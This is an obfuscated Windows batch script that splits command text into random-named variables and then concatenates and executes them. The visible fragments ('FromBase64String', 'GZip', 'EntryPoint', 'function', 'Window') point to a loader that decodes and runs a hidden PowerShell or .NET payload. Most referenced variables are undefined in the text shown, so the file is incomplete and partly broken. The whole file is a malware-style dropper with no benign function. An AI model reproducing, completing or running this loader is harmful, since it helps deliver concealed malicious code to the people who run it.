@echo off
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "DDYcrZmrlA=Conv"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "tFjStsLnBF=exe""
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "ICXcVNUBRy=ecut"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "cLJuxXxyHS=eam("
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "HIFMfrRHDR=lVLk"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "njCRAIpAMD=romB"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "FoVLOoiDsj=_var"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "erEYSvRyMt=.GZi"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "szNLiuvXmK=e[]]"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "wUUvlsmtAD=.ToA"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "AkVyBIZUOC=stem"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "MFRQcLHsqR=ion "
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "sZPBMtUzVl=if($"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "bPMqObJSrk=ctio"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "AXLzPBmvlV=YDz0"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "uDYsXYuWZO=[str"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "SVmGwLnUSh=ndow"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "hcuarbCofm= (,["
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "eSmNqUOPCz=;$ek"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "devBOUqrkl=e]::"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "CfnbDDCTUT=Line"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "RXQoVigDeA=Leng"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "qBnExOSffL=urzJ"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "WQlRhIAMBs=amOD"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "dCMVdUOKmV=oint"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "YGDhkDdwup=Wind"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "yyqwLPCrMe=4Str"
%UlGmgimciS%%OqwwgAwVok%%mkpEYgMVKT%%ydZcZhFkih%%FvBSQwigsD%%JUZDHJWcoZ%%wqrpuLquxZ%%UlMhFQJxNC%%YGDhkDdwup%%lCWjKpdmxf%%fOItJxiRYQ%%ZypMbPNkeQ%%HTZhOroDwq%%NxZIwjXkyM%%vlyDqMnkhV%%BThHxlPAEr%%jEuHdBzHpR%%RDMsuwvvRb%%devBOUqrkl%%uwFgDQQQAO%%mGVpdYgPmb%%QtJDoejTTj%%liwexvYFOE%%FEVcOwjfyP%%NBfjuaNbSy%%HXXqDekQSI%%aBaIvlyHOR%%VdvdwKcmJw%%IWNpWHHEzK%%msnQPlAwNj%%CfnbDDCTUT%%bYhwadOKLO%%EThdEDQFnk%%jFyATCJLMs%%eNKGIokQPM%%xQLZFIXjwZ%%NXFJJvzHCx%%ucXsJQjBuq%%sZPBMtUzVl%%EzpNFhhbWn%%ODosrvSspO%%zwOfHNidWp%%BaMrTUNkNC%%IiEhCPLwjr%%ABjgLhLjgR%%YeeGMNRXyx%%HIFMfrRHDR%%cLTEPZRFFL%%iEeVEEdXvP%%YNYMKSVwbt%%qeFoOmkzRM%%VlrNodEKiA%%nTlNToNhUW%%euEmveYPgr%%uEfITMwkxH%%olnAfwSSuz%%zcEVIBHerj%%eODRgJOCUg%%SCJnHSgdgZ%%lguGSrZkas%%frTnCzHwtv%%IpXoHWsrnP%%uDYsXYuWZO%%KDCBbAJwKi%%lKKKrWigZV%%YHWkXCtApE%%fKxELeNwnh%%mWGfEKSnbb%%PnXdQcHsDy%%higgcAmfZm%%iMTRJbbRFn%%JfznPSNuOI%%xvSOaeQAdd%%xNoOScufuO%%bPMqObJSrk%%NSqqPNUeRE%%lBNBQVQKvM%%xHaaGHIBaY%%uXiTqExXYe%%ipoPCAbkzS%%lYxEMgSpKi%%fseSjnsUlm%%ySLqEiskxf%%FychNwADgk%%LhnQZPlvFo%%igYntsmhaE%%NHSECGqWfN%%NONbArEVqP%%WXFiXyAPNv%%jtDCwepJot%%zoqRButXMc%%NrQlHQbJGd%%gAiKDtkkEw%%cVGWpHGNHD%%fCcKHSCsVG%%cFcknYfGoh%%jisqaRKTVa%%jocdYDyycL%%RSpYtwTwJr%%BazztXjMKP%%hIwUwODYlJ%%AHDCqrSuWE%%YokEyjOCJb%%uMNmDivuCF%%SUkaRTxWjc%%ePPfRTySwm%%ZapkpOUqZh%%VxSrLedjNF%%MRtHWEWHvK%%JDYpFRFZKc%%ZgXbhHXxuM%%PofQAhHHoK%%RmUpyryCLT%%zdzKFFUszo%%HynJUuyhPx%%kXLalNmICP%%juMAnMPulU%%noiacsYkud%%TqMnJBsyyS%%tmPKfnMNwi%%FdWUkVPLXT%%PbnzWSHyRL%%tqVtBbzyUP%%FlOmyPtSdN%%MHAFdrZpNm%%FoVLOoiDsj%%wrQinDmabh%%yPueYMQqpk%%bjKIkrpdyj%%HQzUrvQssz%%eYoFNPTRMb%%ySnihmGiYV%%njCRAIpAMD%%WyXQfdVeUu%%yyqwLPCrMe%%OItwlVwwfe%%AsejfaUxde%%qBnExOSffL%%gXNHOneBEj%%GyZQTfuhrL%%UfoINmvPZw%%cqquYCFwvR%%VtSTxSCxKr%%uLOuQaJeTB%%SoBhgqhFRq%%AXLzPBmvlV%%KYfHcrCWDY%%TACTZHRLMh%%KXGtRwZoEo%%OoTYQUjUfP%%NlbSxavSAi%%KBIelNrLPF%%snrokEGEde%%yWFXtyVNWR%%bhOvEmFOMd%%CxeAwzTNIS%%tQOvKOVLKM%%REPYDlzVKX%%YRRZCaRfAT%%FiedxlssLQ%%qUeamXIfWl%%aXcLUBZPTK%%WQlRhIAMBs%%SgkUHeNRME%%rLioSHftjW%%lCzbTzInSE%%wWEEtUNidP%%NhdpskHXYA%%ChDEgqHiah%%vAYihvgEUY%%UXptieykJJ%%SLosbptZxd%%nEiWtmiVhW%%ddcZGFSjwc%%RwzrpKlGhS%%cggRKpOsZV%%VDcMFOIpMw%%wjDvlQfRHJ%%aCOpUXXkoq%%QAkAgnuMMA%%cWUKvSDKGU%%kXKqUtPNSH%%RxavFWZdpY%%wsfhGdIdTb%%tmEugSPUFN%%xGUeIEWyfz%%TAvHxRSDJR%%LMURoFSFpM%%hfxCAPybyc%%hjXuhTQXWo%%alkObKMdQd%%MrjssOcTgI%%tRfHJBOAJu%%OVIbMVUJAQ%%dvkupQaFcs%%RXQoVigDeA%%VmtvpRIhFw%%UttqFXGKrT%%BjyqDQeufD%%OqEZUQbPfy%%hSZFyxEAJX%%CwmkZMOdSy%%MoccIDPtvO%%WRFSLIjSRf%%mEKiaretah%%cYWGMTQXWU%%IkeUbLRtzq%%DVlNmiDTbr%%zvsoMXUYgS%%SlWXxbzQhp%%AKUKEgNjtD%%qXWFvmSQid%%QSnGysYoql%%IMLLRPBIJF%%kLFCBUorCk%%jJHdzHxnml%%hzTiVDllOG%%LkgDTenKfD%%dHMfbZfHmj%%rnvyxLSwHX%%JdDWzYCeku%%tMiIhAMNgV%%yDYEoxOIfi%%lRdhUaeQFd%%xaxRQFfNqX%%YfpMzfeYHb%%kUZbiCJaOh%%vWhdyyghOI%%sbsikgBqIO%%VfiESCbvIn%%WeYiBbXlna%%ZXkZJjBRRc%%asralpODlV%%xKyAMncjGi%%jqcHOYViUI%%bkDGnENYWl%%mtasDpyKnw%%hskISKpKmm%%uGICUngSnh%%AemuWPpKez%%AkVyBIZUOC%%ocMJQGKxyq%%iFwfWcfPMc%%uEFNMjKkal%%nleLTxsCEp%%eSmNqUOPCz%%CjiLhJxZXG%%VAwmcXBLmy%%KClwXCsSwR%%vUIBIddsDj%%atFXuEvZKs%%scDdOaYLNE%%rECglaRVDZ%%UjhdyqXnct%%htheysrFMI%%erEYSvRyMt%%MAvLyjUAEy%%cLJuxXxyHS%%JmiVUCEild%%zzBIGHXwFp%%xRboGtHjBU%%YtRUJAsAQV%%EMpAYDkaOQ%%ZaSsuSlToA%%VuHqfgHGZf%%pxFJKLBApd%%jHvLVXAyAR%%pylpakeYvS%%VDbJBBvjHI%%qLDlrnZVvi%%FighQQmpIA%%HCexhGFLkt%%CqQRADUZYM%%kjDnmMxTSK%%ofAhbNGgeK%%InLbFproGm%%WnqVpxZRkv%%jLTAewPJQN%%XNVoeWyBHX%%uinGObOFRD%%OPVJBWukXi%%zIxToiscQt%%ZyjnaaymLc%%IkRnZiRmMi%%BnDyyMLtrG%%JLOyEqFIIA%%xizUAoQkUg%%qgpIRMUKOn%%peVftWwtJI%%CiDlKtOJYk%%VAzkpDvgGR%%wUUvlsmtAD%%SxBlDhCeXx%%YkMEsOFKPQ%%BpMRmIohar%%guivryZnHi%%ariiTlipdw%%NCDKcCKKYV%%SudFrDcrmT%%PsdHPjgDXb%%AYeEEEQxsO%%NpoMpFoDRp%%jQdjHvzWUT%%vhMXuUqzaM%%NEYxgzdqsk%%VDLHSJVVWj%%eUCztGCrrv%%pOCfCERFch%%siDKXSvfeK%%YuCQHSbzeA%%XLZWUgaGen%%RpSPRWqSBA%%kxnGwUmLxK%%DsACkGjHQR%%ROaQTICMYL%%BjXDpzyszZ%%UojuKyPqFk%%MJcKJwxwNO%%szNLiuvXmK%%iQhQWCEGgu%%TlhNYShmTS%%ccFLHvBylq%%dSdUcWClOh%%SQpsUgsZMq%%midtIgkviB%%afuPqbimLc%%qVyMalMmRB%%dCMVdUOKmV%%LgdngMvzbT%%YfnKarKqsw%%uYDHyxtzMw%%mxaQqjRkFo%%QmkYCXpbVL%%jyrPBNCwOJ%%sWNFGAfxtQ%%zzKeGhNFeB%%isEamOgkoD%%GvwWWTzFrc%%RSIemJNmjt%%ZXrnAarNsS%%tViQkedNiM%%IincJqJzOC%%aTbVDJeiwW%%BMmzIVJSTi%%GaewLRJpEk%%qSYQSzUmmB%%ZVrlkWWOtN%%GRGGWZPEkM%%ZODlFJNwHi%%bxFsiKJSlO%%UVWQEzlsTS%%KpcACkrfGB%%iAhkLjlnxl%%qWtvReSNHg%%xuCOyMufQX%%tDmKFuOLeu%%nYVHBOVGIx%%sExzdOXsMZ%%OfxASMJJPx%%qhImSzzVnJ%%QOxsFOgNGR%%wwZeGhAvOO%%fmRkhkVkHD%%pcfcjaIfUd%%GWdYbUhDGK%%ZegyEEXmlu%%TVgcCtrXVG%%zvAKiijSjn%%dsEWEkWGxE%%dvUzkLQavH%%DjHZkDDvpw%%vedXrBqjyr%%xKArDeBaAx%%sixBKTKFLa%%HAraiZrWiJ%%uGBekTJqwg%%cDVSdmGCny%%QLyyKWtziE%%MFRQcLHsqR%%jujEXdEyXW%%sOIKSIidto%%zjhRtxLfPr%%FomwowCTAG%%rUCmmYWhXu%%DDYcrZmrlA%%rzIFreClww%%goDMWFHVFv%%AEhvObpjfo%%jlHZpSmXVi%%vLKAnoamgL%%srMQZNrmQp%%PsfhmVHDxd%%sKawZPTGhz%%addtWSyRaB%%AZgFtcFDos%%HwOctHqpQk%%TKeqpLpMlt%%wPDVDtDvdX%%kqsPSDobao%%CibQIPVPpH%%NSrUWSTSza%%eVmTZDspyL%%xnLWRnNNnN%%xNfwjrYxSa%%KwBakGWiQe%%xFrEkzhvdI%%efEMCqQPJI%%EVwxbaMLMk%%qFXipSwAmJ%%kDtkWERPyU%%PhyizCjTDj%%NwISsyiwwK%%TpDZxbBmBw%%jWmSvjhOIN%%ICXcVNUBRy%%vvtOazDyKy%%bWsgaRjPxi%%ruNIbqsAeK%%gZudaNDySV%%GIdkMMkRce%%EfdJgbIKNJ%%hcuarbCofm%%oLXCCIqCWp%%gAyZgbVLWZ%%fTLiNEodSK%%jVMQQShBhy%%LfNyDGDvUq%%fRsghuaPPY%%umKmfkOIin%%UuDynZfnFg%%aSjCEsDFJv%%SsMjdyuBss%%SVmGwLnUSh%%pNjIYBdiHM%%HiZMvBIuuO%%EEUmoeGCfT%%fJNBgeidlB%%vmTGLJWzlU%%cSzdCKTXuT%%VAcOHYvxGq%%tFjStsLnBF%
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "GICfmmyfkp=exit"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "cEFKcKvmwH= /b"
%GICfmmyfkp%%cEFKcKvmwH%
